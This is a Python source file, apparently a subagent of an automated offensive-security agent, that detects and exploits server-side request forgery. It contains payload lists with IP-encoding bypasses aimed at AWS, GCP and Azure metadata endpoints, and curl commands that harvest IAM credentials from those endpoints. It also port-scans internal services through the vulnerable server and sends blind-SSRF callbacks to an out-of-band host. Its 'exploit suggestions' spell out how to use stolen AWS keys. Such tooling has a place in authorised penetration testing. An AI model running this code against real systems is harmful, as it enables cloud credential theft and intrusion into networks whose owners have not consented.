"""
ssrf_subagent.py — Server-Side Request Forgery detection and exploitation.

AGENT_NAME   : "web"
SUBAGENT_NAME: "ssrf"

Methodology:
  1. Identify injectable parameters (URL, path, import, fetch, webhook inputs)
  2. Test internal service probing: 127.0.0.1, 169.254.169.254 (cloud metadata)
  3. Test common SSRF bypass techniques (decimal IP, hex, 0x7f, ① encoded)
  4. Attempt AWS/GCP/Azure IMDS credential theft via SSRF
  5. Probe internal ports via SSRF (port scan through the server)
  6. Test blind SSRF via Burp Collaborator-style OOB detection (interactsh)
"""
from __future__ import annotations
import logging, re
from typing import Any
from agents.base_subagent import BaseSubagent, Finding, SubagentResult

logger = logging.getLogger(__name__)

_IMDS_RE    = re.compile(r'(ami-id|instance-id|iam/security-credentials|metadata\.google|MSI/token|identityCredentials)', re.I)
_INTERNAL_RE = re.compile(r'(127\.|10\.|192\.168\.|172\.(1[6-9]|2\d|3[01])\.|localhost|internal|intranet)', re.I)
_OOB_RE     = re.compile(r'(interact\.sh|burpcollaborator|oast\.me|canarytokens)', re.I)
_BLIND_HIT  = re.compile(r'(dns.*query|http.*request|interaction.*received|hit detected)', re.I)


# Common SSRF parameter names
SSRF_PARAMS = [
    "url", "uri", "path", "src", "dest", "redirect", "target",
    "load", "fetch", "pull", "link", "host", "site", "html",
    "page", "return", "next", "file", "document", "reference",
    "goto", "forward", "continue", "proxy", "image_url", "webhook",
]

# SSRF bypass payloads (point to AWS IMDS)
IMDS_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://[::ffff:169.254.169.254]/latest/meta-data/",
    "http://2852039166/latest/meta-data/",          # decimal form of 169.254.169.254
    "http://0xa9fea9fe/latest/meta-data/",           # hex form
    "http://169.254.169.254%2Flatest%2Fmeta-data%2F",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
]

INTERNAL_PAYLOADS = [
    "http://127.0.0.1/",
    "http://localhost/",
    "http://[::1]/",
    "http://0x7f000001/",
    "http://0177.0.0.1/",
    "http://127.1/",
    "http://127.0.0.1:22/",
    "http://127.0.0.1:3306/",
    "http://127.0.0.1:6379/",    # Redis
    "http://127.0.0.1:8080/",
    "http://127.0.0.1:9200/",    # Elasticsearch
    "http://127.0.0.1:27017/",   # MongoDB
]


class SsrfSubagent(BaseSubagent):
    """Detect and exploit Server-Side Request Forgery vulnerabilities."""

    AGENT_NAME    = "web"
    SUBAGENT_NAME = "ssrf"

    async def run(self, target: str, web_urls: list | None = None,
                  oob_host: str = "", **kwargs: Any) -> SubagentResult:
        result = SubagentResult(session_id=self.session_id, subagent_name=self.SUBAGENT_NAME, target=target)
        web_urls = web_urls or [f"http://{target}"]

        for base_url in web_urls[:3]:
            await self._test_url(target, base_url, oob_host)

        result.findings    = list(self._findings)
        result.tool_outputs = dict(self._tool_outputs)
        return result

    async def _test_url(self, target: str, base_url: str, oob_host: str):
        # ── 1. Spider parameters from the page ────────────────────────
        spider_out = await self.collect_tool("bash", target,
            {"options": f"-c \"curl -sk '{base_url}' 2>/dev/null | grep -oE '(\\?|&)[a-zA-Z_]+=([^&\\\" ]+)' | head -30\""})
        page_params = set(re.findall(r'[?&]([a-zA-Z_]+)=', spider_out))
        testable = list(page_params & set(SSRF_PARAMS)) + [p for p in SSRF_PARAMS if p in base_url.lower()]

        if not testable:
            testable = ["url", "path", "src", "redirect"]  # always try common ones

        # ── 2. Cloud IMDS tests ───────────────────────────────────────
        for payload in IMDS_PAYLOADS[:4]:
            for param in testable[:3]:
                test_url = f"{base_url}?{param}={payload}"
                curl_out = await self.collect_tool("bash", target,
                    {"options": f"-c \"curl -sk --max-time 8 '{test_url}' 2>&1 | head -30\""})
                if _IMDS_RE.search(curl_out):
                    # Try to harvest IAM credentials
                    role_out = await self.collect_tool("bash", target,
                        {"options": f"-c \"curl -sk --max-time 8 '{base_url}?{param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/' 2>&1\""})
                    if role_out.strip():
                        cred_out = await self.collect_tool("bash", target,
                            {"options": f"-c \"curl -sk --max-time 8 '{base_url}?{param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_out.strip()}' 2>&1\""})
                    else:
                        cred_out = curl_out

                    await self.store_finding(Finding(
                        title=f"SSRF CRITICAL: Cloud Metadata (IMDS) Accessible — ?{param}={payload[:50]}",
                        description=(
                            f"SSRF confirmed via parameter '{param}'. Cloud IMDS returned metadata. "
                            f"IAM role: {role_out.strip()[:60] or 'unknown'}. "
                            f"Credentials possibly leaked."
                        ),
                        severity="CRITICAL",
                        evidence=f"Payload: {test_url[:200]}\nResponse: {cred_out[:600]}",
                        tool="bash", host=target, port=None,
                        mitre_technique="T1552.005",
                        exploit_suggestion=(
                            f"Harvest AWS keys:\n"
                            f"  curl '{base_url}?{param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_out.strip()}'\n"
                            f"Then: AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... aws s3 ls"
                        ),
                    ))

        # ── 3. Internal service probe ─────────────────────────────────
        internal_hits = []
        for payload in INTERNAL_PAYLOADS:
            for param in testable[:2]:
                test_url = f"{base_url}?{param}={payload}"
                resp = await self.collect_tool("bash", target,
                    {"options": f"-c \"curl -sk --max-time 5 -o /dev/null -w '%{{http_code}} %{{size_download}} %{{time_total}}' '{test_url}' 2>&1\""})
                parts = resp.strip().split()
                if len(parts) >= 2:
                    code, size = parts[0], parts[1]
                    # A response other than the default error page suggests SSRF
                    if code in ("200", "301", "302", "403", "401") and int(size) > 0:
                        internal_hits.append((param, payload, code, size))

        if internal_hits:
            await self.store_finding(Finding(
                title=f"SSRF: {len(internal_hits)} Internal Service Probe Response(s) — Blind SSRF Likely",
                description=(
                    f"Parameters respond differently with internal IPs, suggesting SSRF:\n"
                    + "\n".join([f"  ?{h[0]}={h[1]} → HTTP {h[2]} ({h[3]} bytes)" for h in internal_hits[:8]])
                ),
                severity="HIGH",
                evidence=str(internal_hits[:10]),
                tool="bash", host=target, mitre_technique="T1090",
                exploit_suggestion=(
                    f"Probe internal ports:\n"
                    + "\n".join([f"  curl '{base_url}?{internal_hits[0][0]}=http://127.0.0.1:{p}/'"
                                 for p in [22, 80, 443, 3306, 6379, 8080, 9200]])
                ),
            ))

        # ── 4. Blind SSRF via OOB (interactsh) ───────────────────────
        if oob_host:
            for param in testable[:3]:
                oob_payload = f"http://{oob_host}/ssrf-{param}"
                oob_url = f"{base_url}?{param}={oob_payload}"
                await self.collect_tool("bash", target,
                    {"options": f"-c \"curl -sk --max-time 5 '{oob_url}' > /dev/null 2>&1\""})
            # Check for interactions
            oob_check = await self.collect_tool("bash", target,
                {"options": f"-c \"interactsh-client -server {oob_host} -n 5 2>&1 | head -10\""})
            if _BLIND_HIT.search(oob_check):
                await self.store_finding(Finding(
                    title=f"SSRF CONFIRMED (Blind/OOB): DNS/HTTP callback received at {oob_host}",
                    description=f"Blind SSRF confirmed via out-of-band DNS/HTTP interaction at {oob_host}.",
                    severity="HIGH",
                    evidence=oob_check[:400],
                    tool="bash", host=target, mitre_technique="T1090",
                    exploit_suggestion=f"Escalate to IMDS theft: curl '{base_url}?{testable[0]}=http://169.254.169.254/latest/meta-data/'",
                ))

        # ── 5. Port scan via SSRF ─────────────────────────────────────
        if internal_hits:
            param = internal_hits[0][0]
            open_ports = []
            for port in [22, 25, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 27017]:
                resp = await self.collect_tool("bash", target,
                    {"options": f"-c \"curl -sk --max-time 3 -o /dev/null -w '%{{http_code}} %{{size_download}}' '{base_url}?{param}=http://127.0.0.1:{port}/' 2>&1\""})
                parts = resp.strip().split()
                if len(parts) >= 1 and parts[0] not in ("000", ""):
                    open_ports.append(port)

            if open_ports:
                await self.store_finding(Finding(
                    title=f"SSRF Port Scan: {len(open_ports)} Internal Port(s) Reachable — {open_ports}",
                    description=f"Internal ports accessible through SSRF vector (param: {param}): {open_ports}",
                    severity="HIGH",
                    evidence=f"Open ports: {open_ports}",
                    tool="bash", host=target, mitre_technique="T1046",
                    exploit_suggestion=f"Interact with internal Redis: curl '{base_url}?{param}=http://127.0.0.1:6379/'" if 6379 in open_ports else None,
                ))
